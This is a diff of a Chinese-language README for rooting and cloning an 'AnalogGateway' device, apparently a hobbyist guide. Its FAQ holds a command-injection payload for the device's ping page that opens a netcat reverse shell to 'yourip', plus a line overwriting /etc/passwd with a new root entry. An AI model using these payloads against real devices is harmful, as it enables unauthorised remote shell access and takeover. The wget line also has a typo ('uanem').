@@ -136,8 +136,8 @@ auto_update -b u-boot.bin
 auto_update -u -f AnalogGateway.img
 ```
 
-## FAQ
-### 获取 root 权限
+# FAQ
+## 获取 root 权限
 1. ssh 用户名修改为 super 即可
 2. ping 页面进行 shell 注入
   * `google.com;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/ash -i 2>&1|nc yourip 1234 >/tmp/f`
@@ -147,21 +147,26 @@ cat /etc/passwd
 echo 'root:$6$p5UxF/96kKYh3eVj$laEQueyeV4tDJV5ASR3kj7r5X/BtXQ/PJM4dCrnAo1M8HtSlDWupG7TQQ.r1wTncK.Jze4NNa9UN37wvT0L/L/:0:0:root:/tmp:/bin/bash' > /etc/passwd
 ```
 
-### torybox 工具包
+## toybox 工具包
 
 ```bash
 wget https://landley.net/toybox/downloads/binaries/latest/toybox-$(uanem -m)
 ```
 
-### clone system
+## clone system
+- 主要目录 /etc, /data, my_tools, /www
+- /www 一般为 link，不同版本指向不同位置
+- /tmp 下会存储一些运行和系统信息
 
 ```bash
 ssh -p 12345 root@192.168.99.1 'cd /etc; tar cf - ./' | tar xvf - -C etc
 ```
 
-### fix local perm
+## fix local perm
+删除 link, 修复 目录 和 文件 权限
 
 ```bash
+find . -type l -delete
 find . -type d | xargs chmod 0744
 find . -type f | xargs chmod 0644
 ```
